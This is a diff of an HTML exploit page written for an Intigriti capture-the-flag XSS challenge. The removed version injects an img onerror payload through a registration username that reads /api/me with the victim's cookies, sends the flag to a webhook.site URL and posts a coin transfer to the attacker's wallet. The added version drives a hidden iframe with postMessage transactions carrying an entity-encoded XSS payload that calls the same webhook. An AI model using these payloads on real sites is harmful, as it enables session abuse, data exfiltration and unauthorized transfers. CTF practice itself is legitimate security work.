@@ -1,120 +1,114 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>PostMessage XSS Test</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:12px;max-height:400px;overflow-y:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
+    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:12px;max-height:400px;overflow-y:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
 </head>
 <body>
-    <h1>🎯 XSS Exploit V2 - Shorter Payload</h1>
+    <h1>PostMessage XSS Injection Test</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/1148a3b9-5f27-49fa-ad07-752309da2e9a';
-
-        // Short XSS payload - same format that worked in bypass test
-        const XSS_USERNAME = `x_${Math.random().toString(36).substring(2, 8)}&lt;img src=x onerror=&quot;
-            fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('${WEBHOOK}',{
-                mode:'no-cors',body:JSON.stringify({flag:d.flag})
-            })).then(fetch('/api/transaction',{
-                method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',
-                body:JSON.stringify({toAddress:'${OUR_WALLET}',currency:'1337COIN',amount:1})
-            })).then(alert('gigawatz'))
-        &quot;&gt;`;
+        const WEBHOOK = 'https://webhook.site/b246fc0d-9847-4916-884f-55328286c44a';
 
         let step = 0;
 
         function log(msg, type = 'info') {
             step++;
-            const timestamp = new Date().toLocaleTimeString();
-            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg}</div>`;
+            const ts = new Date().toLocaleTimeString();
+            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg}</div>`;
             console.log(`[${step}] ${msg}`);
-
-            new Image().src = `${WEBHOOK}/?s=${step}&m=${encodeURIComponent(msg)}&t=${type}&ts=${Date.now()}`;
+            new Image().src = `${WEBHOOK}/?s=${step}&m=${encodeURIComponent(msg.substring(0,100))}&t=${type}&ts=${Date.now()}`;
         }
 
-        async function exploit() {
-            log('🚀 EXPLOIT STARTED', 'info');
-            log('XSS Username (truncated): ' + XSS_USERNAME.substring(0, 70) + '...', 'warning');
+        async function test() {
+            log('Testing postMessage with HTML entity XSS in toAddress...', 'info');
 
             try {
-                // STEP 1: Register
-                log('Step 1: Registering...', 'info');
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
+                document.body.appendChild(iframe);
 
-                const regResp = await fetch(TARGET + '/api/register', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        username: XSS_USERNAME,
-                        password: 'Pass123!'
-                    })
+                await new Promise(resolve => {
+                    iframe.onload = resolve;
+                    setTimeout(resolve, 5000);
                 });
 
-                const regData = await regResp.json();
-                log('Registration: ' + regResp.status, regResp.ok ? 'success' : 'error');
+                log('Iframe loaded', 'success');
+                await new Promise(r => setTimeout(r, 3000));
 
-                if (!regResp.ok && !regData.error?.toLowerCase().includes('exists')) {
-                    log('❌ Reg failed: ' + JSON.stringify(regData), 'error');
-                }
+                // Test 1: Normal address (should work)
+                log('Test 1: Normal address', 'info');
 
-                // STEP 2: Login
-                log('Step 2: Logging in...', 'info');
-
-                const loginResp = await fetch(TARGET + '/api/login', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    credentials: 'include',
-                    body: JSON.stringify({
-                        username: XSS_USERNAME,
-                        password: 'Pass123!'
-                    })
-                });
-
-                const loginData = await loginResp.json();
-                log('Login: ' + loginResp.status, loginResp.ok ? 'success' : 'error');
-
-                if (!loginResp.ok) {
-                    log('❌ Login failed: ' + JSON.stringify(loginData), 'error');
-                    return;
-                }
-
-                // STEP 3: Transaction
-                log('Step 3: Making transaction...', 'info');
-
-                const txResp = await fetch(TARGET + '/api/transaction', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    credentials: 'include',
-                    body: JSON.stringify({
+                iframe.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
                         toAddress: OUR_WALLET,
                         currency: '1337COIN',
                         amount: 1
-                    })
-                });
+                    }
+                }, '*');
 
-                const txData = await txResp.json();
-                log('Transaction: ' + txResp.status, txResp.ok ? 'success' : 'error');
+                await new Promise(r => setTimeout(r, 3000));
 
-                // STEP 4: Alert
-                log('Step 4: Triggering alert...', 'info');
-                alert('gigawatz');
+                // Test 2: XSS payload in toAddress
+                log('Test 2: HTML entity XSS in toAddress', 'warning');
 
-                // STEP 5: Redirect
-                log('Step 5: Redirecting to marketwatch...', 'warning');
+                const XSS_ADDRESS = `&lt;img src=x onerror=&quot;
+                    fetch('${WEBHOOK}',{mode:'no-cors',body:JSON.stringify({xss:'toAddress_test'})})
+                &quot;&gt;`;
+
+                log('Sending toAddress with XSS: ' + XSS_ADDRESS.substring(0, 60) + '...', 'info');
+
+                iframe.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: XSS_ADDRESS,
+                        currency: '1337COIN',
+                        amount: 1
+                    }
+                }, '*');
+
+                log('postMessage sent with XSS toAddress', 'info');
+                await new Promise(r => setTimeout(r, 5000));
+
+                // Check marketwatch
+                log('Checking marketwatch...', 'info');
+
+                const mwResp = await fetch(TARGET + '/api/marketwatch', { credentials: 'include' });
+                const mwData = await mwResp.json();
+
+                log('Transactions: ' + mwData.length, 'info');
+
+                // Look for transactions with our XSS payload
+                const xssTx = mwData.find(tx => tx.address && tx.address.includes('&lt;'));
+
+                if (xssTx) {
+                    log('✅ Found XSS in transaction address!', 'success');
+                    log('Address: ' + xssTx.address.substring(0, 100), 'info');
+                } else {
+                    log('No XSS in address field (sanitized or rejected)', 'warning');
+                }
+
+                // Redirect to marketwatch to visually check
+                log('Redirecting to marketwatch...', 'warning');
+
                 setTimeout(() => {
                     window.location.href = TARGET + '/marketwatch.html';
                 }, 3000);
 
             } catch (error) {
-                log('❌ ERROR: ' + error.message, 'error');
+                log('ERROR: ' + error.message, 'error');
             }
         }
 
         window.addEventListener('load', () => {
-            log('Loaded, starting...', 'info');
-            setTimeout(exploit, 1000);
+            log('Starting postMessage XSS test...', 'info');
+            setTimeout(test, 1000);
         });
     </script>
 </body>
